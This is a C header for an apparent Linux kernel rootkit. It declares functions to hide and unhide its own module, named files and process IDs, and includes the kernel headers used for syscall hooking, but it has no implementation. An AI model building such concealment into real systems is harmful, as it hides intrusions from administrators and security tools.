#ifndef _HIDING_H
#define _HIDING_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <linux/version.h> // LINUX_VERSION_CODE
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <asm/paravirt.h> // write_cr0


int is_module_hidden(void);
int is_file_hidden(const char* name);
int is_pid_hidden(int pid);
int pathname_includes_pid(const char* pathname);

int hide_module(void);
int unhide_module(void);
int hide_file(const char* name);
int unhide_file(const char* name);
int hide_pid(int pid);
int unhide_pid(int pid);
void delete_lists(void);

void print_hidden(void);
#endif